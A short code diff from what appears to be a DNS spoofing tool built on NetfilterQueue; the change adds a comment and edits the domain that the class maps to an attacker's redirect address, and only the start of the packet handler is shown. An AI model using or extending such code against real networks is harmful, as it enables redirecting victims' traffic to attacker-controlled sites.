@@ -11,10 +11,11 @@ from netfilterqueue import NetfilterQueue
 global listening
 global list_of_dns
 
+# class that houses dns spoofing code
 class DnsSpoofing:
     def __init__(self, attacker_website_redirect):
         self.attacker_website_redirect = attacker_website_redirect
-        self.dns_get_websites = {b"www.hatzwebsite.com.": attacker_website_redirect}
+        self.dns_get_websites = {b"hatzwebsite.com.": attacker_website_redirect}
 
     def process_dns(self, packet):
         my_packet = IP(packet.get_payload())
